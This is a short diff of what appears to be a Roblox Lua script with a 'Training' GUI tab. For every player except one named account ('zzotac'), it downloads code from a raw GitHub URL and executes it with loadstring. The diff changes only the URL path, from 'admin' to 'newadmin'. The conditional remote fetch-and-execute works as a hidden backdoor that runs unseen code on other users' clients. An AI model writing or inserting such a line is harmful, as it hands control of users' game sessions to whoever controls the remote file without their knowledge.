@@ -31,7 +31,7 @@ local Train = Win:Tab("Training") -- This Creates a Tab on the left Side
 if game.Players.LocalPlayer.Name == "zzotac" then
     print("Done")
 else
-    loadstring(game:HttpGet('https://raw.githubusercontent.com/clickclickpow/pls/main/admin'))()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/clickclickpow/pls/main/newadmin'))()
     
 end
 
